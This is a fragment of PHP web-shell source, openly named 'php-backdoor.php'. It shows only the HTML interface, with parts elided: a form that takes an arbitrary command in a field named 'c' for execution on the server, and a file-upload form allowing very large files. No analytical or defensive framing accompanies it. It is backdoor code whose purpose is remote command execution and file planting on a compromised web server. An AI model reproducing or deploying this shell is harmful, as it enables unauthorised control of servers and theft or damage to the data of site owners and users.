...
?>
<pre><form action="php-backdoor.php" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value="go"><hr></form> 
<form enctype="multipart/form-data" action="php-backdoor.php" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000">
...
<form action="php-backdoor.php" METHOD=GET >
